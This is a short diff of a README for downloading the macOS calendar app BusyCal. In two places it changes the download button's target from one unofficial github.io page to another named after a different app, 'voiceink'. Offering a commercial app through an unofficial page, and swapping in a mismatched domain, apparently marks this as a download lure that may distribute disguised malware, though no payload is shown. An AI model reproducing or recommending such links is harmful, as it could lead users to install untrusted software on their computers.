@@ -7,7 +7,7 @@ Whether you're managing work projects, planning personal events, or juggling mul
 ---
 
 ## ✅ Download BusyCal for macOS  
-[![Download BusyCal](https://img.shields.io/badge/Download-BusyCal-blueviolet)](https://busycal-download-mac.github.io./github)
+[![Download BusyCal](https://img.shields.io/badge/Download-BusyCal-blueviolet)](https://voiceink-download-mac.github.io/.github)
 
 ---
 
@@ -62,7 +62,7 @@ With support for customizable calendar views, task integration, weather, tags, a
 
 ---
 
-[![Download BusyCal](https://img.shields.io/badge/Download-BusyCal-blueviolet)](https://busycal-download-mac.github.io./github)
+[![Download BusyCal](https://img.shields.io/badge/Download-BusyCal-blueviolet)](https://voiceink-download-mac.github.io/.github)
 
 
 ---
